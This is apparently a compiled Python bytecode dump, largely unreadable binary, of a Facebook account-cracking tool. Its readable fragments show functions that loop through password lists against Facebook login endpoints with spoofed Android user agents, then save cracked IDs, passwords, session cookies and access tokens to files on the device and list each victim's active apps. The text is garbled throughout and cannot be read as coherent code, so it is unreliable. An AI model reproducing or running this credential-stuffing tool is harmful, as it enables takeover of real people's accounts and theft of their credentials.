d�}d�                     d � |j!        �"                    �   �         �#                    �   �         D �   �         �  �        }|d!z  }i d"d�d#d�d$d%�d&d�d'd(�d)d�d*d+�d,d-�d.|�d/d�d0d1�d2d�d3d�d4d�d5d| z   dz   �d6d7�d8d9�d:d;i�}|	�$                    d<|d=|i|d>|�?�  �        }d@|j!        �"                    �   �         �%                    �   �         v r�dAtL          v r1tN          �(                    | dBz   |
z   �  �         tS          | |
�  �         n�dAtT          v r�tW          dC�  �         dD| � dE|
� �}tY          |dF�G�  �        }t[          tY          |dH�I�  �        �  �         t]          dJt^          z   dK�  �        �                    | dBz   |
z   dCz   �  �         tN          �(                    | dBz   |
z   �  �         t(          dz  an��} �nLdL|	j!        �"                    �   �         �%                    �   �         v �r�d.dMi}dNt`          v r�|j!        �"                    �   �         }d�                     dO� |	j!        �"                    �   �         �#                    �   �         D �   �         �  �        }t]          dPtb          z   dK�  �        �                    | dBz   |
z   dBz   |z   dCz   �  �         tW          dC�  �         dD| � dQ|
� dR|� �}tY          |dS�G�  �        }t[          tY          |dT�I�  �        �  �         t&          dz  a �n dAt`          v �r�|j!        �"                    �   �         }d�                     dU� |	j!        �"                    �   �         �#                    �   �         D �   �         �  �        }t]          dVtb          z   dK�  �        �                    | dBz   |
z   dBz   |z   dCz   �  �         | }dW}t          j        �   �         }|�                    dX||�Y�  �        j        }|�                    dZ||�Y�  �        j        }|d[z  }t9          j2        d\t-          |�  �        �  �        }d}|D ]"}|d]|� d^|d_         � d`|d         � da�z  }|dz  }�#d_}|dbz  }t9          j2        d\t-          |�  �        �  �        } d_}| D ]"}|dz  }|dc|� d^|d_         � d`|d         � dd�z  }�#tW          dC�  �         de| � dQ|
� dR|� df|� �}tY          |dS�G�  �        }t[          tY          |dg�I�  �        �  �         t&          dz  a n4n������# t          j3        j4        $ r tk          j6        dh�  �         Y ���w xY wt          dz  ad S )iNrK   r*  r;  r<  r�  zMBASIC[1;97m][[93mre   z[1;97m][[32mOK:r  z[1;97m][[95mr  u   ☬ �mbasic.facebook.comr>  r?  r/   r@  rA  rB  rC  rD  rE  z=https://mbasic.facebook.com/login/device-based/password/?uid=�)&flow=login_no_pin&refsrc=deprecated&_rdrrQ  r   rR  z.https://mbasic.facebook.com/login/save-device/rT  rU  r[  c                 �"   � g | ]\  }}|�d |����S r]  r�   r^  s      r   rb  zmbasic.<locals>.<listcomp>�  rc  r   rd  rF  rG  re  rf  rH  rg  rh  rI  ri  rd  rk  rl  r;  rJ  rm  rn  rK  rL  rM  ro  rp  rq  rN  z#fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7�
connection�closezHhttps://mbasic.facebook.com/login/device-based/validate-password/?shbl=0r�   Frs  rv  r�  r  rx   �   [•] ID       : �    [•] PASSWORD : r�  r  zCHANG CPr  z/sdcard/CHANG/CP/r�   r|  ��SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]r�  c                 �"   � g | ]\  }}|�d |����S r]  r�   r^  s      r   rb  zmbasic.<locals>.<listcomp>�  r�  r   �/sdcard/Ahmad/OK/r�  r�  r  r  c                 �"   � g | ]\  }}|�d |����S r]  r�   r^  s      r   rb  zmbasic.<locals>.<listcomp>�  r�  r   z/sdcard/Ahmad-DATA/OK/rC   r�  r�  r�  �:   
[bold cyan][•] LIST ACTIVE APPLICATIONS :[/bold cyan] 
r�  �[bold cyan][r  r   rM   �[/bold cyan]
�>   
[bold yellow][•] LIST EXPIRED APPLICATIONS :[/bold yellow]
r�  r�  �   [bold green][•] ID       : �[/bold green]
z![bold green]CHANG OK[/bold green]r   )7r�   r�   r�   r�   r�  r�   r�   r�  r�  r
   r�  r�  r|   �ugen2r~   r�   r�   r�   r�   r�  r�  rN  r   r�   r�   r>  r  r   r�   r�   r�   r�   r�   r�   r�  r�  r�  r�  r�  r�  r}   r�  r�  r   r�   r�   ry   r   r�  r�  r�   r�   r�   r�   r�   )!r
  r  r�  r�  r�  r�  r�  r�   r�  r�   r�  r�   r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  s!                                    r   r�  r�  �  s�	  � ��m�Q�q��A�a��O�$�$���S���S�����
���]�4����	��S��!���m�D�����}�U��������������  np�  np�  np�  qu�  qu�  qu�  vy�  z}�  v~�  v~�  v~�  v~�  A�  A�  A�  BD�  BD�  BD�  EH�  IM�  EN�  EN�  EN�  OR�  SV�  OW�  OW�  OW�  OW�  XY�  XY�  XY�  Z�  [�  [�  [�  \_�  \f�  \l�  \l�  \n�  \n�  \n�� E� E�R�D��;���4�k�fj�  IL�  []�  hq�  DQ�  dj�  }D�  X}�  ~�  ~�  �  �  �
�w�w�N�s�R�S~�~���1���5�s�1�6�{�{�C�C�I�I�!�L�L�WY�W`�a�  BE�  FG�  FL�  BM�  BM�  XN�  XN�  XT�  XT�  UV�  XW�  XW�  ^a�  iY�  ao�  wy�  {�  {�5��*�*�^�^��	�@R�@R�@T�@T�@Z�@Z�@\�@\�^�^�^�
_�
_�4��	+�+�4� 
D�&�'�  
D���  
D�[�R|�  
D�  ~P�  RV�  
D�  Wk�  mx�  
D�  yT�  VY�  
D�  Zb�  dA�  
D�  BP�  Ru�  
D�  vB�  DF�  
D�  GO�  QZ�  
D�  [m�  o�  
D�  @P�  R_�  
D�  `p�  rx�  
D�  yI	�  K	R	�  
D�  S	\	�  ^	]
�  ^
a
�  ^	a
�  b
M�  ^	M�  
D�  N_�  at�  
D�  uF�  Hm�  
D�  nz�  |C�  
D�  
D�5����[�af�px�z~�o�  IN�  _d�  mr��  	s�  	s�2��b�j�)�)�+�+�0�0�2�2�2�2��u�}�}�	�[�[��S�������
�3�r�]�]�]�]�	����
�4�[�[�[�?�C�?�?�2�?�?�X��X�U�+�+�+�Y�
�3�y�
�+�+�+�,�,�,�	�
�c�
!�#�&�&�,�,�S��W�R�Z��_�=�=�=�	�[�[��S���������U�R�R�	�	�E��C�K�(�(�*�*�/�/�1�1�1�1��  T�  U�G��y���
�*�
�
�
�
�T��J�J�b�b�#�+�BV�BV�BX�BX�B^�B^�B`�B`�b�b�b�c�c�T�	�
�c�
!�#�&�&�,�,�S��W�R�Z��^�D�-@��-E�F�F�F�
�4�[�[�[�Y�C�Y�Y�B�Y�Y�SW�Y�Y�X��X�W�-�-�-�Y�
�3�y��%�%�%�&�&�&���U�R�
�U�	��	�	�
�*�
�
�
�
�T��J�J�b�b�#�+�BV�BV�BX�BX�B^�B^�B`�B`�b�b�b�c�c�T�	�
"�3�
&�s�+�+�1�1�#�c�'�"�*�S�.��2E�d�2J�K�K�K�
�T��X���!�!�W��K�K�X�ae�nu�K�v�v�{�T�
�+�+�T�]a�jq�+�
r�
r�
w�S��Q�R�X��j�{�|�  AD�  }E�  }E�  F�  F�X�	
�S�� � ���M��M�M��q�	�M�M�F�1�I�M�M�M�N�h�	�1�f�c�c�	
�S��U�V�X��J�y�z}�  C�  {D�  {D�  E�  E�V�	
�S�� T� T��	�1�f�c��R�C�R�R�6�!�9�R�R�v�a�y�R�R�R�S�h�h�
�4�[�[�[�~��~�~��~�~�_c�~�~�t|�~�~�X��X�W�-�-�-�Y�
�3�y� C�D�D�D�E�E�E���U�R�
�U�9 
�@ �A 
��B 
�	�	,� � � ��:�b�>�>�>�>�>������q����s'   �I7[3�D)[3�G*[3�.[3�3(\�\c                 �  � t          j        t          t          t          t
          t          t          g�  �        }t          dz  t          t          �  �        z  }d}t          d|�dt          �dt          t          �  �        �dt          �dt          �dt          |�  �        �t          |�  �        �d	t           ��d
��  �         t"          j        �                    �   �          t          j        t(          �  �        �                    dd�  �        }t-          j        �   �         }|D �]}	 t          t          j        dd�  �        �  �        t          t          j        dd�  �        �  �        t          t          j        dd�  �        �  �        dd|ddd�}|�                    dt          | �  �        z   dz   t          |�  �        z   dz   |��  �        }	d|	�                    �   �         d         v r�dt6          v r1t8          �                    | dz   |z   �  �         t=          | |�  �         n|t          dt
          �d
| �d |�d!��  �         t?          d"t@          z   d#�  �        �!                    | dz   |z   dz   �  �         t8          �                    | dz   |z   �  �         t          d$z  a n�d%|	j"        v rgd&|	j"        v r^t          dt          �d
| �d |�d!��  �         t?          d'tF          z   d#�  �        �!                    | dz   |z   dz   �  �         t          d$z  a n1���# t,          j$        j%        $ r tM          j'        d(�  �         Y ��w xY wt          d$z  ad S ))NrK   r*  r�  zX-FB[1;97m][[0;34mz[1;97m/[1;91mz[1;97m][[1;92mOK/z[1;97m]-[[1;96mCP/z[1;97m][[93mr  rM   ra  rx   rC   r�  r�  r�  r�  r�  r�  rl  r�  r�  z;https://x.facebook.com/method/auth.login?format=json&email=r�  r�  r=  r�  r�  r�  r  r  ry  r�  r  r�   r   r�  �EAAAr  r   )(r�   r�   r�   r�   r�  r�   r�   r�  r�  r
   r�  r   r�  r�  rN  r   r�   r�   r�   r�   r|   rK  r~   r�   r�  r   r�   r�  r�  r}   r�  ry   r   r�   r�   r�  r�   r�   r�   r�   )
r
  r  r�  r�  r�  r�   r�   r�  r�  r�  s
             r   r�  r�  �  s0  � ��m�Q�q��A�a��O�$�$���S���S�����
����  uw�  uw�  uw�  x|�  x|�  x|�  }@�  AD�  }E�  }E�  }E�  }E�  FH�  FH�  FH�  IK�  IK�  IK�  LO�  PT�  LU�  LU�  LU�  VY�  Z]�  V^�  V^�  V^�  V^�  _`�  _`�  a�  gj�  k�  k�  k�  k�  lo�  lv�  l|�  l|�  l~�  l~�  l~��m�D���!�!�$�r�*�*�������� � �R��(+�F�N�:�z�,R�,R�(S�(S�eh�io�iw�x}�  @E�  jF�  jF�  fG�  fG�  Y\�  ]c�  ]k�  lq�  sx�  ]y�  ]y�  Yz�  Yz�  Wb�  |_�  oq�  Cf�  |C�  D�  D�4�
�'�'�O�PS�TW�PX�PX�X�Ye�e�fi�jl�fm�fm�m�  o_�  _�  im�'�  n�  n�4��D�I�I�K�K��4�4�4��u�}�}�	�[�[��S�������
�3�r�]�]�]�]�
�U����3�3�3�r�r�r�B�C�C�C�	�%��)�C�����s�3�w�r�z�$��/�/�/�	�[�[��S���������U�R�	�E����"�"�v���':�':�	�E����#�#�#�b�b�b�
A�B�B�B���s��3�����c�#�g�b�j��o�.�.�.���E�B�	�E���	�	�	,� � � ��:�b�>�>�>�>�>������q����s   �&E:L�"A.L�(M �?M c                 �\	  � t          j        t          t          t          t
          t          t          g�  �        }t          dz  t          t          �  �        z  }d}t          d|�dt          �dt          t          �  �        �dt          �dt          �dt          |�  �        �t          |�  �        �d	t           �d
�d��  �         t"          j        �                    �   �          t          j        g d��  �        }t          j        g d��  �        }t)          j        �   �         }|D �]~}	 t          j        t,          �  �        }	dd|	z   i}
|j        �                    dddd|dddddd�
�  �         |�                    d| z   dz   �  �        }t5          j        dt          |j        �  �        �  �        �                    d�  �        t5          j        dt          |j        �  �        �  �        �                    d�  �        | d d!|d"�}d#�                    d$� |j        �                     �   �         �!                    �   �         D �   �         �  �        }|d%z  }i d&d�d'd�d(d)�d*d�d+d,�d-d�d.d/�d0d1�d2|�d3d�d4d5�d6d�d7d�d8d�d9d| z   dz   �d:d;�d<d�}|�"                    d=|d>|i|d?|
�@�  �        }dA|j        �                     �   �         �#                    �   �         v r�t          dBtH          � | � dC|� tJ          � dD|� tL          � �	�  �         tO          dEtP          z   dF�  �        �)                    | dGz   |z   dHz   �  �         tT          �+                    | dGz   |z   �  �         t          dz  a �nCdI|j        �                     �   �         �#                    �   �         v r�t          dz  a|j        �                     �   �         }d#�                    dJ� |j        �                     �   �         �!                    �   �         D �   �         �  �        }t          dBtX          � | � dC|� dD|� dD|� tL          � �
�  �         tO          dKtZ          z   dF�  �        �)                    | dCz   |z   dCz   |z   dHz   �  �         t]          t^          |�  �          n1��Q# t(          j0        j1        $ r te          j3        dL�  �         Y ��|w xY wt          dz  ad S )MNrK   r*  r_  r�  re   r�  r�  r�  r�   r1  rM   ra  r�  r�  r;  r<  r=  r>  r?  r/   r@  rA  rB  rC  rD  rE  rO  rP  rQ  r   rR  rS  rT  rU  r[  c                 �"   � g | ]\  }}|�d |����S r]  r�   r^  s      r   rb  zdfb.<locals>.<listcomp>4  rc  r   rd  rF  rG  re  rf  rH  rg  rh  rI  ri  rj  rk  rl  r;  rJ  rm  rn  rK  rL  rM  ro  rp  rq  rN  rr  r�   Frs  rv  r	  r  r
  r  r�   r{  rx   r|  c                 �"   � g | ]\  }}|�d |����S r]  r�   r^  s      r   rb  zdfb.<locals>.<listcomp>A  r~  r   r  r   )4r�   r�   r�   r�   r�  r�   r�   r�  r�  r
   r�  r   r�  r�  rN  r   r�   r�   r�   r�   r~   r�   r�  r>  r  r   r�   r�   r�   r�   r�   r�   r�  r�  r�  r�  rU   r8   r2   ry   r   r�   r�  r}   rR   r�  r�  r�  r�   r�   r�   r�   r�  s                     r   r�  r�    s`  � ��m�Q�q��A�a��O�$�$���S���S�����
����b�b�b����c�#�h�h�h�h�r�r�r�RT�RT�RT�UX�Y]�U^�U^�U^�_b�cf�_g�_g�_g�_g�hi�hi�hi�j�ps�t�t�t�t�ux�u�  vF�  vF�  vH�  vH�  vH��m� � � � � �� �}� � � � � �� ������ � �R���}�T���3��;�s�?�
#�5��;���/��ae�  DG�  VX�  cl�  L�  _e�  x�  Sx�  y�  y�  z�  z�  z�
�w�w�I�#�M�  Oy�  y�  z�  z�1���5�s�1�6�{�{�C�C�I�I�!�L�L�WY�W`�a�  BE�  FG�  FL�  BM�  BM�  XN�  XN�  XT�  XT�  UV�  XW�  XW�  ^a�  iM�  Uc�  km�  o�  o�5��*�*�^�^��	�@R�@R�@T�@T�@Z�@Z�@\�@\�^�^�^�
_�
_�4��	+�+�4� 
^�&�"�  
^�?�K�  
^��Mw�  
^�  yK�  MQ�  
^�  Rf�  hs�  
^�  tO�  QT�  
^�  U]�  _w�  
^�  xF�  Hk�  
^�  lx�  z|�  
^�  }E�  GP�  
^�  Qc�  eu�  
^�  vF�  HU�  
^�  Vf�  hn�  
^�  o�  A	H	�  
^�  I	R	�  T	N
�  O
R
�  T	R
�  S
}�  T	}�  
^�  ~O�  Qd�  
^�  ev�  x]�  
^�5����d�jo�  zB�  DH�  yI�  RW�  hm�  v{��  	|�  	|�2��b�j�)�)�+�+�0�0�2�2�2�2�	�
>�!�
>�S�
>�
>�2�
>�q�
>�
>�r�
>�1�
>�
>�?�?�?���s��3�����c�'�k�"�n�T�1�2�2�2��K�K��G��B�������E�B�	�E��C�K�(�(�*�*�/�/�1�1�1�1���E�B�	��	�	�	�	�D��:�:�a�a���AU�AU�AW�AW�A]�A]�A_�A_�a�a�a�b�b�D�	�
N�!�
N�S�
N�
N�2�
N�
N�D�
N�
N�r�
N�1�
N�
N�O�O�O���s��3�����c�#�g�b�j��n�R�/��4�5�5�5��G�D����	�E���	�	�	,� � � ��:�b�>�>�>�>�>������q����s   �&H6Q3�DQ3�3(R�Rc                 �`
  � t          j        dg�  �        }t          dz  t          t          �  �        z  }d}t
          j        �                    d|�dt          �dt          t          �  �        �dt          �dt          �d	t          |�  �        �t          |�  �        �d
t          �d��  �         t
          j        �                    �   �          t          j        g d��  �        }t          j        g d��  �        }t          d|�dt          �dt          t          �  �        �dt          �dt          �dt          |�  �        �t          |�  �        �d
t          �d�d��  �         t
          j        �                    �   �          d}t
          j        �                    d|�dt          �dt          t          �  �        �dt          �dt          �dt          |�  �        �t          |�  �        �d
t          �d��  �         t
          j        �                    �   �          t          j        t          �  �        �                    dd�  �        }t#          j        �   �         }t
          j        �                    d|�dt          �dt          t          �  �        �dt          �dt          �dt          |�  �        �t          |�  �        �d
t          �d��  �         t
          j        �                    �   �          d}d}t#          j        �   �         }|D �]}	 t          t          j        dd�  �        �  �        t          t          j        d d!�  �        �  �        t          t          j        d d!�  �        �  �        d"d#|d$d%d&�}	|�                    d't          | �  �        z   d(z   t          |�  �        z   d)z   |	�*�  �        }
d+|
�                    �   �         d,         v r�d-t,          v r1t.          �                    | d.z   |z   �  �         t3          | |�  �         n|t          d/t4          �d| �d0|�d1��  �         t7          d2t8          z   d3�  �        �                    | d.z   |z   dz   �  �         t.          �                    | d.z   |z   �  �         t          d4z  a	 n�d5|
j        v rfd6|
j        v r]t          d7t<          �d| �d0|���  �         t7          d8t>          z   d3�  �        �                    | d.z   |z   dz   �  �         t          d4z  a n1���# t"          j         j!        $ r tE          j#        d9�  �         Y ��w xY wt          d4z  ad S ):Nr�   rK   r*  r�  zWEB[1;97m][re   r   r  �	[1;97m][r�   r�  r2  r6  u   [1;97m╰───[WEB]r�   r�  r�  r�  r�  rM   ra  r�  �][OK/r�  r1  rx   rC   r_  �    [PROXY][r�  r�  r�  r�  r�  r�  rl  r�  r�  r�  r�  r�  r=  r�  r�  r�  r  �   ├───[1;97m[CP]ry  r�  r  r�   r   r�  r   �   ├───[1;97m[OK]r  r   )$r�   r�   r�  r
   r�  r�   r�   r�   r�  r�  rN  r   r�   r�   r   r|   rK  r~   r�   r�  r   r�   r�  r�  r}   r�  r�   ry   r   r�   r�   r�  r�   r�   r�   r�   r�  s              r   r�  r�  M  s�  � ��m�W�I�����S���S�����
�������  RT�  RT�  RT�  UY�  UY�  UY�  Z]�  ^a�  Zb�  Zb�  Zb�  Zb�  ce�  ce�  ce�  fh�  fh�  fh�  il�  mq�  ir�  ir�  ir�  sv�  wz�  s{�  s{�  s{�  s{�  |}�  |}�  |}�  ~�  �  �  �  @C�  @J�  @P�  @P�  @R�  @R�  @R��m� � � � � �� �}� � � � � �� ��2�2�2�d�d�d�SV�WZ�S[�S[�S[�S[�\^�\^�\^�_a�_a�_a�be�fj�bk�bk�bk�lo�ps�lt�lt�lt�lt�uv�uv�uv�w�  ~A�  B�  B�  B�  B�  CF�  CM�  CS�  CS�  CU�  CU�  CU� c�������VX�VX�VX�Y]�Y]�Y]�^a�be�^f�^f�^f�^f�gi�gi�gi�jl�jl�jl�mp�qu�mv�mv�mv�wz�{~�w�w�w�w�  AB�  AB�  AB�  C�  D�  D�  D�  EH�  EO�  EU�  EU�  EW�  EW�  EW��m�D���!�!�$�r�*�*������������b�b�b����c�RU�h�h�h�h�WY�WY�WY�Z\�Z\�Z\�]`�ae�]f�]f�]f�gj�kn�go�go�go�go�pq�pq�pq�r�s�s�s�tw�t~�  uE�  uE�  uG�  uG�  uG� c�� d�������� � �R��(+�F�N�:�z�,R�,R�(S�(S�eh�io�iw�x}�  @E�  jF�  jF�  fG�  fG�  Y\�  ]c�  ]k�  lq�  sx�  ]y�  ]y�  Yz�  Yz�  Wb�  |_�  oq�  Cf�  |C�  D�  D�4�
�'�'�S�TW�X[�T\�T\�\�]i�i�jm�np�jq�jq�q�  sc�  c�  mq�'�  r�  r�4��D�I�I�K�K��4�4�4��u�}�}�	�[�[��S�������
�3�r�]�]�]�]�
�U�A�A�A�c�c�c�"�"�"�E�F�F�F�	�%��)�C�����s�3�w�r�z�$��/�/�/�	�[�[��S���������U�R�	�E����"�"�v���':�':�	�E�A�A�A�c�c�c�"�"�
=�>�>�>���s��3�����c�#�g�b�j��o�.�.�.���E�B�	�E���	�	�	,� � � ��:�b�>�>�>�>�>������q����s   �E:S5�A-S5�5(T!� T!c                 �  � t          j        dg�  �        }t          dz  t          t          �  �        z  }d}t          d|�t          �dt          t          �  �        �dt          �dt          �dt          |�  �        �t          |�  �        �t          ��d�	�  �         t          j        �                    �   �          d
}d
}t          j        �   �         }|D �]x}	 |j        �                    dd|ddddddddddd��  �         |�                    d�  �        j        }	t)          j        dt          |	�  �        �  �        �                    d�  �        t)          j        dt          |	�  �        �  �        �                    d�  �        | d|dd�}
|j        �                    ddddd |ddddddd!ddd"��  �         |�                    d#|
d$�%�  �        }d&|j        �                    �   �         �                    �   �         v r�t          d't6          � d(t8          � | � d)|� ��  �         t          d't          � d*t          � dt:          � |� t:          � d+�	�  �         t=          d,t>          z   d-�  �        �                     | d)z   |z   d+z   �  �         tB          �"                    | d)z   |z   �  �         t          dz  a �n�d.|j        �                    �   �         �                    �   �         v �rAt          dz  a|j        �                    �   �         }d/�#                    d0� |j        �                    �   �         �$                    �   �         D �   �         �  �        }t          d't6          � d1tJ          � | � d)|� ��  �         t          d't          � d*t          � dtJ          � |� tJ          � ��  �         t          d't          � d*t          � dt:          � |� t:          � d+�	�  �         t=          d2tL          z   d-�  �        �                     | d)z   |z   d)z   |z   d+z   �  �         tO          tP          |�  �          n1��K# t          j)        j*        $ r tW          j,        d3�  �         Y ��vw xY wt          dz  ad S )4Nr�   rK   r*  z TOOLS re   z ok : z cp : rM   ra  r�  r=  r/   r�  r�  rA  rB  rC  r�  r�  r�  r�  r�  r�  rQ  r   rR  rT  r�  r�  r>  rj  rl  r�  r�  r�  Fr�  rv  r_  zCHECKPOINT : r  z*-->rx   r  r�   r|  r[  c                 �"   � g | ]\  }}|�d |����S r]  r�   r^  s      r   rb  ztools.<locals>.<listcomp>�  r~  r   zSUCCESFULY : r  r   )-r�   r�   r�  r
   r�  r   r�  r�  rN  r   r�   r�   r�   r�   r~   r�   r>  r  r   r�   r�   r�   r�   r�  r�   r�  r�  r�   rU   r2   ry   r   r�   r�  r}   r�   r�  rR   r�  r�  r�  r�   r�   r�   r�   r�  s                 r   r�  r�  �  s  � ��m�W�I�����S���S�����
����"�"�T�T�T�#�c�(�(�(�(�2�2�2�b�b�b��T����SV�WZ�S[�S[�S[�\]�\]�^�dg�h�h�h�h�il�is�iy�iy�i{�i{�i{� c�� d�������� � �R���;���.�3�\_�  jJ�  QT�  hu�  GT�  fl�  ~E�  Wa�  lE�  Xj�  }Y	�  Z	�  Z	�  [	�  [	�  [	�
�w�w�  n�  o�  o�  t�1���5�s�1�v�v�>�>�D�D�Q�G�G�RT�R[�\z�|�  AB�  }C�  }C�  SD�  SD�  SJ�  SJ�  KL�  SM�  SM�  TW�  _m�  uw�  y�  z�  z�5��;���.�{�gj�  uM�  ]@�  NP�  Zz�  N[�  mz�  LR�  dk�  }G	�  R	@�  Se�  xT�  U�  U�  V�  V�  V����V�\a�rw��x�x�2��b�j�)�)�+�+�0�0�2�2�2�2�	�
,�q�
,�
,�q�
,�#�
,�
,��
,�
,�-�-�-�	�
&�q�
&�
&�a�
&�
&�!�
&�R�
&��
&�
&�
&�'�'�'���s��3�����c�#�g�b�j��o�.�.�.��K�K��C���
������E�B�	�E��C�K�(�(�*�*�/�/�1�1�1�1���E�B�	��	�	�	�	�D��:�:�a�a���AU�AU�AW�AW�A]�A]�A_�A_�a�a�a�b�b�D�	�
,�q�
,�
,�q�
,�#�
,�
,��
,�
,�-�-�-�	�
&�q�
&�
&�a�
&�
&�!�
&�T�
&�1�
&�
&�'�'�'�	�
&�q�
&�
&�a�
&�
&�!�
&�R�
&��
&�
&�
&�'�'�'���s��3�����c�#�g�b�j��n�T�1�$�6�7�7�7��G�D����	�E� ��	�	�	,� � � ��:�b�>�>�>�>�>������q����s   �GP�.E-P�(Q�
Qc                 �  � t          j        t          t          t          t
          t          t          g�  �        }t          dz  t          t          �  �        z  }d}t          d|�dt          �dt          t          �  �        �dt          �dt          �dt          |�  �        �t          |�  �        �d	t           �d
�d��  �         t"          j        �                    �   �          t          j        g d��  �        }t          j        g d��  �        }t"          j        �                    d|�dt          �dt          t          �  �        �dt          �dt          �dt          |�  �        �t          |�  �        �d	t           �d��  �         t"          j        �                    �   �          t          j        g d��  �        }t          j        g d��  �        }t+          j        �   �         }|D �]}	 t          t          j        dd�  �        �  �        t          t          j        dd�  �        �  �        t          t          j        dd�  �        �  �        dd|ddd�}	|�                    dt          | �  �        z   dz   t          |�  �        z   d z   |	�!�  �        }
d"|
�                    �   �         d#         v r�d$t4          v r1t6          �                    | d%z   |z   �  �         t;          | |�  �         n{t          d&t
          �d| �d'|���  �         t=          d(t>          z   d)�  �        �                    | d%z   |z   d*z   �  �         t6          �                    | d%z   |z   �  �         t          d+z  a n�d,|
j         v rfd-|
j         v r]t          d.t          �d| �d'|���  �         t=          d/tB          z   d)�  �        �                    | d%z   |z   d*z   �  �         t          d+z  a n1���# t*          j"        j#        $ r tI          j%        d0�  �         Y ��w xY wt          d+z  ad S )1NrK   r*  u   [1;97m╰───[VPN]z [re   r&  r�  r�  r�   r�  rM   ra  r2  r6  r�  zVPN[1;97m] [z[1;97m][OK/z[1;97m]-[CP/r%  r1  r�  r�  r�  r�  r�  r�  rl  r�  r�  r�  r�  r�  r=  r�  r�  r�  r  u   [1;97m├───[1;97m[CP]ry  r  r�   rx   r   r�  r�  u   [1;97m├───[1;97m[OK]r  r   )&r�   r�   r�   r�   r�  r�   r�   r�  r�  r
   r�  r   r�  r�  rN  r   r�   r�   r�   r�   r�   r~   r�   r�  r   r�   r�  r�  r}   r�  ry   r   r�   r�  r�   r�   r�   r�   r�  s              r   r�  r�  �  sJ  � ��m�Q�q��A�a��O�$�$���S���S�����
����B�B�B�t�t�t�TW�X[�T\�T\�T\�T\�]_�]_�]_�`b�`b�`b�cf�gk�cl�cl�cl�mp�qt�mu�mu�mu�mu�vw�vw�vw�x�  B�  C�  C�  C�  C�  DG�  DN�  DT�  DT�  DV�  DV�  DV��m� � � � � �� �}� � � � � �� �����  @B�  @B�  @B�  CG�  CG�  CG�  HK�  LO�  HP�  HP�  HP�  HP�  QS�  QS�  QS�  TV�  TV�  TV�  WZ�  [_�  W`�  W`�  W`�  ad�  eh�  ai�  ai�  ai�  ai�  jk�  jk�  jk�  l�  m�  m�  m�  nq�  nx�  n~�  n~�  n@�  n@�  n@��m� � � � � �� �}� � � � � �� ������ � �R��(+�F�N�:�z�,R�,R�(S�(S�eh�io�iw�x}�  @E�  jF�  jF�  fG�  fG�  Y\�  ]c�  ]k�  lq�  sx�  ]y�  ]y�  Yz�  Yz�  Wb�  |_�  oq�  Cf�  |C�  D�  D�4�
�'�'�S�TW�X[�T\�T\�\�]i�i�jm�np�jq�jq�q�  sc�  c�  mq�'�  r�  r�4��D�I�I�K�K��4�4�4��u�}�}�	�[�[��S�������
�3�r�]�]�]�]�
�U�q�q�q����R�R�H�I�I�I�	�%��)�C�����s�3�w�r�z�$��/�/�/�	�[�[��S���������U�R�	�E����"�"�v���':�':�	�E�a�a�a����B�B�
G�H�H�H���s��3�����c�#�g�b�j��o�.�.�.���E�B�	�E���	�	�	,� � � ��:�b�>�>�>�>�>������q����s   �'E9O�"A-O�(O?�>O?c                 �$	  � t          j        t          t          t          t
          t          t          g�  �        }t          dz  t          t          �  �        z  }d}t          d|�dt          �dt          t          �  �        �dt          �dt          �dt          |�  �        �t          |�  �        �d	t           �d
�d��  �         t"          j        �                    �   �          d}t"          j        �                    d|�dt          �dt          t          �  �        �dt          �dt          �dt          |�  �        �t          |�  �        �d	t           �d��  �         t"          j        �                    �   �          t          j        t*          �  �        �                    dd�  �        }t/          j        �   �         }t"          j        �                    d|�dt          �dt          t          �  �        �dt          �dt          �dt          |�  �        �t          |�  �        �d	t           �d��  �         t"          j        �                    �   �          d}d}t/          j        �   �         }|D �]}	 t          t          j        dd�  �        �  �        t          t          j        dd�  �        �  �        t          t          j        dd�  �        �  �        dd|ddd�}	|�                    dt          | �  �        z   dz   t          |�  �        z   dz   |	��  �        }
d |
�                    �   �         d!         v r�d"t8          v r1t:          �                    | d#z   |z   �  �         t?          | |�  �         n|t          d$t
          �d| �d%|�d&��  �         tA          d'tB          z   d(�  �        �                    | d#z   |z   dz   �  �         t:          �                    | d#z   |z   �  �         t          d)z  a n�d*|
j"        v rfd+|
j"        v r]t          d,t          �d| �d%|���  �         tA          d-tF          z   d(�  �        �                    | d#z   |z   dz   �  �         t          d)z  a n1���# t.          j$        j%        $ r tM          j'        d.�  �         Y ��w xY wt          d)z  ad S )/NrK   r*  r_  r'  re   r�  r�  r�  r�   r�  rM   ra  r�  r&  r�  r1  rx   rC   r�  r�  r�  r�  r�  r�  rl  r�  r�  r�  r�  r�  r=  r�  r�  r�  r  r(  ry  r�  r  r�   r   r�  r   r)  r  r   )(r�   r�   r�   r�   r�  r�   r�   r�  r�  r
   r�  r   r�  r�  rN  r   r�   r�   r�   r�   r�   r|   rK  r~   r�   r�  r   r�   r�  r�  r}   r�  ry   r   r�   r�  r�   r�   r�   r�   )r
  r  r�  r�  r�  r�   r�   r�  r�  r�  r�  s              r   r�  r�  �  s�  � ��m�Q�q��A�a��O�$�$���S���S�����
����2�2�2�d�d�d�3�s�8�8�8�8�B�B�B�r�r�r�RU�VZ�R[�R[�R[�\_�`c�\d�\d�\d�\d�ef�ef�ef�g�mp�q�q�q�q�ru�r|�  sC�  sC�  sE�  sE�  sE� c�������b�b�b����c�RU�h�h�h�h�WY�WY�WY�Z\�Z\�Z\�]`�ae�]f�]f�]f�gj�kn�go�go�go�go�pq�pq�pq�r�s�s�s�tw�t~�  uE�  uE�  uG�  uG�  uG��m�D���!�!�$�r�*�*������������b�b�b����c�RU�h�h�h�h�WY�WY�WY�Z\�Z\�Z\�]`�ae�]f�]f�]f�gj�kn�go�go�go�go�pq�pq�pq�r�s�s�s�tw�t~�  uE�  uE�  uG�  uG�  uG� c�� d�������� � �R��(+�F�N�:�z�,R�,R�(S�(S�eh�io�iw�x}�  @E�  jF�  jF�  fG�  fG�  Y\�  ]c�  ]k�  lq�  sx�  ]y�  ]y�  Yz�  Yz�  Wb�  |_�  oq�  Cf�  |C�  D�  D�4�
�'�'�S�TW�X[�T\�T\�\�]i�i�jm�np�jq�jq�q�  sc�  c�  mq�'�  r�  r�4��D�I�I�K�K��4�4�4��u�}�}�	�[�[��S�������
�3�r�]�]�]�]�
